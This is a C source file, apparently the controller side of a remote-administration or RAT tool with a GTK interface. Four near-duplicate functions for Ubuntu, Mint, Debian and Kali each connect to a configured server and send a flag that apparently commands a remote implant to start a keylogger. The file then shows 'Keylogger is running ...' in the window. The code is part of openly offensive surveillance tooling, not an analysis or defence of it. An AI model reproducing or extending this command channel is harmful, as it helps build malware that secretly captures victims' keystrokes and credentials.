#ifdef WIN32
    #include <window.h>
    #include <winsock2.h>
#else
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>  //gethostbyaddr()

    #include <stdio.h>
    #include <stdlib.h>
    #include <errno.h>
    #include <unistd.h>
    #include <string.h>

    #include <gtk-2.0/gtk/gtk.h>

#endif


#include "../includes/constants.h"
#include "../includes/callback.h"


const gchar *server_ip;
const char *server_port;
int port;

GtkWidget *text_view;

void ubuntu_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 10;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "init_keylogger()");
        exit(-1);
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "init_keylogger()");
        exit(-1);
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "init_keylogger()");
        exit(-1);
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}


void mint_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 17;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "init_keylogger()");
        exit(-1);
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "init_keylogger()");
        exit(-1);
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "init_keylogger()");
        exit(-1);
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}


void debian_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 18;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "init_keylogger()");
        exit(-1);
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "init_keylogger()");
        exit(-1);
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "init_keylogger()");
        exit(-1);
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}


void kali_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 19;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "init_keylogger()");
        exit(-1);
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "init_keylogger()");
        exit(-1);
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "init_keylogger()");
        exit(-1);
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}
